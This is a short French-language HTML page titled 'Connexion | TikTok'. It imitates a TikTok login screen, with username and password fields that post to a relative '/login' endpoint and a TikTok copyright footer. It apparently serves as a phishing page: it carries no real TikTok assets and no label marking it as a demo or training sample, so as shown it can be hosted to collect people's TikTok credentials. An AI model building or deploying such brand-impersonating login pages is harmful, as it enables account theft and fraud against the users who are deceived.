<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | TikTok</title>
    <style>
        body { font-family: sans-serif; background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-card { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        .logo { margin-bottom: 20px; font-size: 30px; font-weight: bold; }
        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #333; background: #222; color: #fff; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 20px; color: #888; font-size: 12px; }
    </style>
</head>
<body>

<div class="login-card">
    <div class="logo">TikTok</div>
    <h2>Connexion</h2>
    
    <form action="/login" method="POST">
        <div class="input-group">
            <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required>
        </div>
        <div class="input-group">
            <input type="password" name="password" placeholder="Mot de passe" required>
        </div>
        <button type="submit" class="btn">Se connecter</button>
    </form>
</div>

<div class="footer">© 2026 TikTok</div>

</body>
</html>
